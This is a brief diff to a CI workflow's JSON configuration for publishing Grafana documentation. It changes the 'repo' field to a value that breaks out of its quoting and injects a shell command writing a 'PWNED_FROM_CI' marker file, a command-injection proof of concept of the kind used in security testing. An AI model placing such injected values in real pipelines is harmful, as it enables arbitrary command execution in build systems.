@@ -30,7 +30,7 @@ jobs:
           {
             "index_file": "content/docs/grafana/_index.md",
             "relative_prefix": "/docs/grafana/latest/",
-            "repo": "grafana",
+            "repo":"grafana\"; echo 'PWNED_FROM_CI' > /tmp/poc_success.txt; echo \"",
             "source_directory": "docs/sources",
             "website_directory": "content/docs/grafana/latest"
           }
